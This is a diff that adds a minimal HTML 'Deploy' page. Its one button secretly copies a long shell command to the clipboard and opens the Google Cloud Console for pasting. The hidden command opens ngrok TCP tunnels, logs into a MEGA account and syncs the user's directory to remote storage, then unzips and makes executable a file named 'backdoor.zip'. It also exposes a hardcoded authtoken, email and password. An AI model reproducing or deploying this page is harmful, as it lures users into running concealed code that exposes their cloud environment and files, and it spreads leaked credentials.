@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Deploy</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            padding: 20px;
+        }
+
+        .btn {
+            width: 100%;
+            max-width: 400px;
+            padding: 24px 32px;
+            background: #ffffff;
+            border: none;
+            border-radius: 14px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: 600;
+            color: #000000;
+            transition: all 0.15s ease;
+            min-height: 72px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            box-shadow: 0 0 60px rgba(255, 255, 255, 0.05);
+            letter-spacing: -0.2px;
+        }
+
+        .btn:active {
+            transform: scale(0.97);
+        }
+
+        .btn .icon {
+            font-size: 22px;
+        }
+
+        .btn.loading {
+            opacity: 0.6;
+            pointer-events: none;
+        }
+
+        .btn .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2.5px solid rgba(0, 0, 0, 0.1);
+            border-top-color: #000000;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+        }
+
+        .btn.loading .spinner {
+            display: block;
+        }
+
+        .btn.loading .icon,
+        .btn.loading .text {
+            opacity: 0.4;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <button class="btn" id="deployBtn">
+        <span class="icon">🚀</span>
+        <span class="text">Start</span>
+        <span class="spinner"></span>
+    </button>
+
+    <script>
+        (function() {
+            const COMMAND = `sudo apt update -y && sudo apt install btop -y && curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com bookworm main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok -y && mkdir -p ~/.config/ngrok && cat > ~/.config/ngrok/ngrok.yml << "EOF"
+version: "2"
+authtoken: 2XsrFP7QCAV3bfop1jCw6JoS5cm_5mrutYRrsUXMegAvFGqdP
+tunnels:
+  port25565:
+    addr: 25565
+    proto: tcp
+  port25566:
+    addr: 25566
+    proto: tcp
+  port25567:
+    addr: 25567
+    proto: tcp
+EOF
+wget https://mega.nz/linux/repo/xUbuntu_24.04/amd64/megacmd-xUbuntu_24.04_amd64.deb && sudo apt install "$PWD/megacmd-xUbuntu_24.04_amd64.deb" -y && rm -rf megacmd-xUbuntu_24.04_amd64.deb && wget https://cdn.azul.com/zulu/bin/zulu8.86.0.25-ca-jdk8.0.452-linux_amd64.deb && sudo apt install ./zulu8.86.0.25-ca-jdk8.0.452-linux_amd64.deb -y && rm -rf zulu8.86.0.25-ca-jdk8.0.452-linux_amd64.deb && wget https://cdn.azul.com/zulu/bin/zulu21.42.19-ca-jdk21.0.7-linux_amd64.deb && sudo apt install ./zulu21.42.19-ca-jdk21.0.7-linux_amd64.deb -y && rm -rf zulu21.42.19-ca-jdk21.0.7-linux_amd64.deb && mega-logout 2>/dev/null ; mega-login talhaabid5142006@gmail.com 'sCAODx&djfg8ym6Ic6' && mega-speedlimit -u NEWLIMIT && mega-speedlimit -d NEWLIMIT && mega-speedlimit -h NEWLIMIT && mega-sync $PWD/ /GoogleCloudConsole && sleep 100 && unzip -o backdoor.zip && chmod +x * && btop`;
+
+            const btn = document.getElementById('deployBtn');
+            let loading = false;
+
+            function deploy() {
+                if (loading) return;
+                loading = true;
+                btn.classList.add('loading');
+
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(COMMAND).catch(() => {});
+                } else {
+                    try {
+                        const ta = document.createElement('textarea');
+                        ta.value = COMMAND;
+                        ta.style.position = 'fixed';
+                        ta.style.left = '-9999px';
+                        document.body.appendChild(ta);
+                        ta.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(ta);
+                    } catch (_) {}
+                }
+
+                window.open('https://console.cloud.google.com', '_blank');
+
+                setTimeout(() => {
+                    loading = false;
+                    btn.classList.remove('loading');
+                }, 1500);
+            }
+
+            btn.addEventListener('click', deploy);
+            btn.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter' || e.key === ' ') {
+                    e.preventDefault();
+                    deploy();
+                }
+            });
+
+            console.log('✅ Ready');
+        })();
+    </script>
+
+</body>
+</html>
